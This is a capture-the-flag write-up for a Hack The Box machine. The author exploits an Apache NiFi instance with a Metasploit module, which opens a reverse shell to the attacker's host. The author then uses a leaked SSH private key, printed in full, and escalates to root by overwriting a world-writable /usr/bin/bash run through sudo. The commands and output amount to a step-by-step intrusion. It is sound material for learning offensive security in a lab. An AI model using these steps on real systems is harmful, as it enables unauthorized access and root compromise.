Ok a brand new machine just dropped.

```bash
[+] Summary written to /home/kali/tools/ctf_tool/results/helix.htb/summary.txt


  ════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.129.41.174
  DNS:           helix.htb
  HTTP:          80
  HTTPS:         none
  Generated:     2026-05-10 09:10:28

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.18.0 (Ubuntu)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (1 found)
  ────────────────────────────────────────────────────────
  → flow.helix.htb

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (1 found)
  ────────────────────────────────────────────────────────

  [ http://helix.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /

  ════════════════════════════════════════════════════════

=== Done! Results: /home/kali/tools/ctf_tool/results/helix.htb/ ===
```

Ok so we have 2 ports open ssh and a nginx website. We also have a subdomain "flow" which we will check later.
I checked the websit and there wasnt much to go off. So I checked the subdomain and it directed me to "Apache Nifi"
```bash
Apache NiFi is a framework to support highly scalable and flexible dataflows. It can be run on laptops up through clusters of enterprise class servers. Instead of dictating a particular dataflow or behavior it empowers you to design your own optimal dataflow tailored to your specific environment.
```


We can see that its version 1.20.1 and it has plenty of vulnerabilities. 
https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-38291/version_id-784400/Apache-Nifi-1.21.0.html


I looked up and found out that msfconsole has a module for this specific exploit. I tried to do it manually but wasnt able to get a shell

```bash
msf > search apache nifi

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_nifi_processor_rce  2020-10-03       excellent  Yes    Apache NiFi API Remote Code Execution
   1    \_ target: Unix (In-Memory)                 .                .          .      .
   2    \_ target: Windows (In-Memory)              .                .          .      .
   3  post/linux/gather/apache_nifi_credentials     .                normal     No     Apache NiFi Credentials Gather
   4  exploit/linux/http/apache_nifi_h2_rce         2023-06-12       excellent  Yes    Apache NiFi H2 Connection String Remote Code Execution
   5  auxiliary/scanner/http/apache_nifi_login      .                normal     No     Apache NiFi Login Scanner
   6  auxiliary/scanner/http/apache_nifi_version    .                normal     No     Apache NiFi Version Scanner


Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/http/apache_nifi_version

msf > use 4
[*] Using configured payload cmd/unix/reverse_bash
msf exploit(linux/http/apache_nifi_h2_rce) >
```



```bash
msf exploit(multi/http/apache_nifi_processor_rce) > exploit
[*] Started reverse TCP handler on 10.10.14.118:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. Apache NiFi instance does not support logins
[*] Command shell session 2 opened (10.10.14.118:4444 -> 10.129.41.141:40324) at 2026-05-10 11:05:47 -0400
[*] Waiting 5 seconds before stopping and deleting
[+] Processor Stop sent successfully
[+] Processor Delete sent successfully

id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```

Ok we got shell access. I made the shell more interactive

```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
nifi@helix:/opt/nifi-1.21.0$
```


```bash
╔══════════╣ Writable root-owned executables I can modify (max 200) (T1574.009,T1574.010)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
-rwxrwxrwx 1 root root 1396520 Mar 14  2024 /usr/bin/bash
```

This seems quite interesting. I have seen this before in another machines so this could be an easy way to privesc


but we cant do it yet. We have to get access to the operator user

```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat op     
cat operator_id_ed25519.bak 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```
I found a private key. I'm guessing this is for operator. Let's test it out

```bash
 touch id_rsa 
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ nano id_rsa 
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa        
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ ssh operator@helix.htb -i id_rsa 
The authenticity of host 'helix.htb (10.129.41.184)' can't be established.
ED25519 key fingerprint is: SHA256:nGwNnXA5oCIEMCxZ3joJWy3usUFUt70Wqy72RayvMNA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'helix.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 10 04:46:12 PM UTC 2026

  System load:           0.0
  Usage of /:            86.9% of 6.52GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.129.41.184
  IPv6 address for eth0: dead:beef::a0de:adff:fedf:b775

  => / is using 86.9% of 6.52GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sun May 10 16:46:13 2026 from 10.10.14.118
operator@helix:~$
```

Great. Now we can try to see if we are able to use that writeable /usr/bin/bash now 


```bash
sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Ok so we are able to run a command as root.

```bash
operator@helix:~$ exec sh
$ ps aux | grep bash | grep -v grep
$ echo '#!/bin/sh' > /tmp/payload
$ echo 'cat /root/root.txt > /tmp/flag' >> /tmp/payload
$ cat /tmp/payload
#!/bin/sh
cat /root/root.txt > /tmp/flag
$ cp /tmp/payload /usr/bin/bash
$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
$ sudo /usr/local/sbin/helix-maint-console
$ cat /tmp/flag
83be6339aad103e8e42a12122fab62d1
```

This was an fairly easy privesc due to the fact that I have done it before. Basically we just overwrite the /usr/bin/bash and when we execute a sudo command it executes the payload which delivers the flag to /tmp/flag
